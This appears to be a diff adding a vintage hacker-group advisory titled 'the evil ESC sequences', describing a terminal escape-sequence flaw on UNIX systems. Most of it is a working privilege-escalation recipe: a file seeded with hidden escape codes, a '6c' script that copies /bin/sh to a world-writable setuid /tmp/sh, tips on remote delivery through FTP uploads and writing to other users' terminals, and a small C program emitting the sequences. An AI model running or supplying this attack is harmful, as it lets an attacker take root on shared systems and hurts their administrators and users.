@@ -1,0 +1,123 @@
+
+                      ___      ______      _       _
+                    /     \   |   _   \   |  \   /  |
+                   |  / \  |  |  |  \  |  |   \_/   |
+                   | |___| |  |  |_ /  |  |   \_/   |
+..oO  THE          |  ---  |  |       /   |  |   |  |         CreW Oo..
+                   '''   '''   '''''''    ''''   ''''
+                               presents
+
+                         the evil ESC sequences
+                         
+                          
+
+hi well here is describe a bug seem affects UNIX  .. (Linux/BSD/Sunos)
+
+he can just compromise the root ... ( or any users on the system ..)
+
+bugs: 
+
+[root@ADM root]#echo -e  "\033\132"
+
+[root@ADM root]#6c
+bash: 6c: command not found
+[root@ADM root]#
+
+well the  ESC\132 put 6c on your cmb line   just need to tape enter ...
+
+how to use for r00ted som1 ??? very very easy heheh :)
+
+1:
+
+[xbug@ADM XbuG]$touch passwd-list-of-ftp-warez
+[xbug@ADM XbuG]$echo -e "\033[30m\033\132" >> passwd-list-of-ftp-warez
+
+2:
+
+make the proggies 6c ..
+
+[xbug@ADM XbuG]$cat > 6c
+#!/bin/sh
+cp /bin/sh /tmp/sh
+chmod 4777 /tmp/sh
+^C
+[xbug@ADM XbuG]$chmod +x 6c
+
+3:
+
+now if the root make a cat or a more on your file passwd-list-of-ftp-warez ..
+he can be 0wnd hhe
+
+[root@ADM XbuG]#cat passwd-list-of-ftp-warez
+
+( now if i type enter i'm ownd .. u cant see the 6c because the ESC[30m
+ cache him .. ;)
+
+
+note: humm  on other term that be != of 6c .. try out first :) 
+
+ps: hehehe that can be remote too...
+
+<Raw-Powa> u can get remote access with it
+<Raw-Powa> ftp victim
+<Raw-Powa> cd incoming
+<dxmechie> remote?
+<Raw-Powa> put 6c
+<dxmechie> hha
+<Raw-Powa> chmod +x 6c
+<Raw-Powa> put EvillFilEzInFecTeD
+
+hey a other trik ...
+
+u can do echo -e "\033\132..." >> /dev/ttyXX
+
+yahoooo :)
+
+
+i'm sure they have 36568 ways for sploit diz b00g have fun :>
+
+
+------new esc-------
+
+<Solar_Diz> echo -e "\033[5;0n"
+<Solar_Diz> another escape, more portable this way ;-)
+
+thx to him :)
+-------------------
+
+---[bloody echo]--------------------------------------------------------------
+#include <stdio.h>
+
+void main () {
+ 
+ (void) printf("\033[30m");  /* black color           */
+ (void) printf("\033\132");  /* evil escape sequences */
+ 
+}
+-------------------------------------------------------------------------------
+
+credits:  Heike even ...  
+
+cut/n/past
+
+#hax       heike-raw  H@  ~d0@raid0.toxyn.org (d0)
+#hax       ^Che       H@  ahg@geisli-93.centrum.is (Ernesto Che Guevara)
+#hax       appel      H@  appel@appel.isirc.is (Já, ég nota ullarnærföt!)
+#hax       crazy-b    H@  ~crazy-b@t5o207p20.telia.com (crazy-b)
+#hax       SLUT       H@  crazy-b@music.is (digit 0WNS me)
+#hax       su1d       H@  teddi@irc.music.is (Theodor Ragnar Gislason)
+#hax       NetGuru    H@  ~netguru@hp735.cs.uni-magdeburg.de (NetGuru of
+                      deep/CyberDyne)
+#hax       CUNT       H@  crazy-b@josva.dataguard.no (BugTester - DataGuard)
+#hax       Ph\\Je     H@  lice@dat95kjn.campus.mdh.se (d4 phuqen ph4lze
+                                 j3h0va)
+#hax       zh4p       H@  wiltsu@rai.rauma.fi ("try to smoke me up")
+#hax       DiGiT      H@  teddi@geisli-26.centrum.is (warp speeds..           
+                )
+
+
+Cya.
+
+Check out .. or die :) ftp.janova.org/pub/ADM 
+ADM@janova.org
+                                 
